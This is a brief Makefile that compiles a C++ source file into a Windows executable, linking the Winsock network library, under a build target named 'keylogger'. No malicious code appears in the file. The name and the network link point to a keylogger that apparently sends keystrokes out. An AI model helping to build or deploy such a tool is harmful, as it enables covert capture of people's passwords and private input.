G++ = g++  -O3
#--pedantic-errors -Wall -Wextra -Werror -Wfatal-errors
mkdir: directory main

directory:
	if not exist ./bin/ mkdir -p ./bin/

main: keylogger

keylogger:
	${G++} ./src/main.cpp -lws2_32 -o ./bin/main.exe;
